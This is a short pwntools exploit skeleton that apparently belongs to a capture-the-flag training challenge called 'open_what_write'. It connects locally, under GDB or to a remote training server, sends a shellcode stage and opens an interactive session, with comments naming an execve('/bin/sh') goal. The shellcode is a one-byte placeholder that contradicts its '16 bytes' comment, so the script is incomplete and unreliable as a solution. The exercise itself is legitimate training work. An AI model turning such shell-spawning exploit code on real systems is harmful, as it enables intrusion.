from pwn import *

COMMANDS = """
"""

shellcode = b"\x50"

if args.GDB:
    p = gdb.debug("./open_what_write", gdbscript=COMMANDS)
elif args.REMOTE:
    p = remote("open-what-write.training.offensivedefensive.it", 8080, ssl=True)
else:
    p = process("./open_what_write")

# Send first stage loader (exactly 16 bytes)
p.send(shellcode)

p.interactive()

#execve("/bin/sh\0", NULL, NULL)
#0x0068732f6e69622f